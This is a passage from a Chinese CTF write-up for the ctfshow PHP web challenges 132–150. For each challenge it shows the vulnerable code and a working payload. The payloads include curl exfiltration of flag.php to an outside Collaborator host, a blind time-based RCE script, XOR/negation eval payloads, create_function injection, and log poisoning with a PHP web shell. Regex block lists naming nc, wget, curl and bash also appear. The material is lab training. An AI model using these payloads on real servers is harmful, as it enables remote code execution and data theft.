        die('bye!!');
    }

    echo $flag;

} 
```

老老实实用PCRE回溯吧



### web132

扫出/admin

```
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
} 
```

这题的突破点在于

```
if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")
```

```
<?php
if(false && false || true){
	echo "true!";
}else{
    echo "false!";
}
?>

//返回结果为true
```

**payload**

```
?code=admin&password=admin&username=admin
```



### web133

```
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

```
get传参   F=`$F `;sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval("`$F `;");
我们把原来的$F带进去
eval("``$F `;sleep 3`");
也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec("`$F `;sleep 3");
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了
```

无回显我们可以用反弹shell 或者curl外带 或者盲注
 这里的话反弹没有成功，但是可以外带。

```
curl  http://xxx:4567?p=`tac f*`
```

当然要是没有公网ip的话，bp也可以帮到我们这个忙

**payload**

```
/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;
```



### web134

```
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

用`extract`进行变量覆盖

测试一下

```
parse_str($_SERVER['QUERY_STRING']);
var_dump($_POST);
//然后我们传入 _POST[‘a’]=123
会发现输出的结果为array(1) { ["‘a’"]=> string(3) “123” }
也就是说现在的$_POST[‘a’]存在并且值为123
```

**payload**

```
?_POST[key1]=36d&_POST[key2]=36d
```



### web135

```
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

**payload**

```
?F=`$F` ;cp flag.php 2.txt;
?F=`$F` ;uniq flag.php>4.txt;
```



### web136

```
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

虽然过滤了很多，但是在linux中我们可以用tee写文件

**payload**

```
ls|tee 1.txt
ls / |tee 1.txt
cat /f* |1.txt
```



### web137

```
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}



call_user_func($_POST['ctfshow']); 
```

很简单，直接调用ctfshow类里的getFlag方法

```
POST:ctfshow=ctfshow::getFlag
```

借用yu22x师傅的拓展

> php中 ->与:: 调用类中的成员的区别
> ->用于动态语境处理某个类的某个实例
> ::可以调用一个静态的、不依赖于其他初始化的类方法.
>
> **也就是说双冒号可以不用实例化类就可以直接调用类中的方法**



### web138

```
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

相比于上一题，这个题过滤了冒号

call_user_func中不但可以传字符串也可以传数组

本地测试

```
call_user_func(array($classname, 'say_hello'));
这时候会调用 classname中的 say_hello方法
```

**payload**

```
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```



### web139

```
 <?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?> 
```

只能盲打咯

脚本

```
import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
    print(j)
    if key==1:
        break
    for n in str:
        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
        #print(payload)
        url="http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c="+payload
        try:
            requests.get(url,timeout=(2.5,2.5))
        except:
            result=result+n
            print(result)
            break

```



### web140

```
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}

```

```
if(intval($code) == 'ctfshow')
```

这里进行的是弱比较,可以用null绕过

```
$code = eval("return $f1($f2());"); 
```

```
intval('a')==0 intval('.')==0 intval('/')==0
```

payload

```
md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1
```

实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件



### web141

```
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

`/^\W+$/` 作用是匹配非数字字母下划线的字符,

看看下面这句话

```
eval("return 1;phpinfo();");
```

显然这里的`phpinfo()`是不执行的，但数字是可以和命令进行一些运算的，例如 `1-phpinfo();`是可以执行phpinfo()命令的。

```
eval("return 1-phpinfo();");//可以执行
```

**payload**

```
v1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1
```



### web142

```
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
} 
```

这里我们令`v1=0`就可以让`$d=0`



### web143

```
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

过滤了加减，我们可以用乘除，过滤了取反我们可以用异或

**payload**

```
v1=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")*&v2=1
```



### web144

```
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了

**payload**

```
?v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)
```



### web155

```
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

看了yu22x师傅的wp，妙！

```
eval("return 1?phpinfo():1;");
```

这里考察了三目运算符，这里是可以执行phpinfo()的

```
?v1=1&v3=?(~%8F%97%8F%96%91%99%90)():&v2=1
```

这样可以执行phpinfo()

payload

```
?v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1
```



### web146

```
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符

```
eval("return 1==phpinfo()||1;");
```

这里可以执行phpinfo()

**payload**

```
?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&v2=1

?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1

?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1
```



### web147

```
highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

不会，还是老老实实看wp吧。

考察点：create_function()代码注入

```
create_function('$a','echo $a."123"')

类似于

function f($a) {
  echo $a."123";
}

```

那么如果我们第二个参数传入 echo 1;}phpinfo();//
 就等价于

```
function f($a) {
  echo 1;}phpinfo();//
}
从而执行phpinfo()命令
fuzz后发现%5c可以绕过这个正则表达式
```

**payload**

```
get: ?show=echo 123;}system('tac f*');//
post: ctf=%5ccreate_function
```



### web148

```
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

未过滤异或，直接构造

**payload**

```
?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
```



### web149

```
error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

非预期

往index.php直接写马，然后蚁剑连接即可

预期解

文件竞争，一个负责一直写文件，一个负责一直读文件



### web150

```
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}

```

日志绕过

```
POST /?isVIP=1 HTTP/1.1
Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show
User-Agent: <?php eval($_POST[1]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.2.1418869291.1680592508
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

ctf=/var/log/nginx/access.log&1=system('cat f*');
```



### web150_plus

```
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}
```

过滤了log，不能日志包含绕过了

> ```
> 这个题一点点小坑__autoload()函数不是类里面的
> __autoload — 尝试加载未定义的类
> 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
> 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
> __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
> 接下来就去getshell啦
> ```

**payload**

```
/?..CTFSHOW..=phpinfo
```

php变量不能含有点空格，遇到这些会自动转化为下划线





------

总算是写完啦，不过这永远不是终点...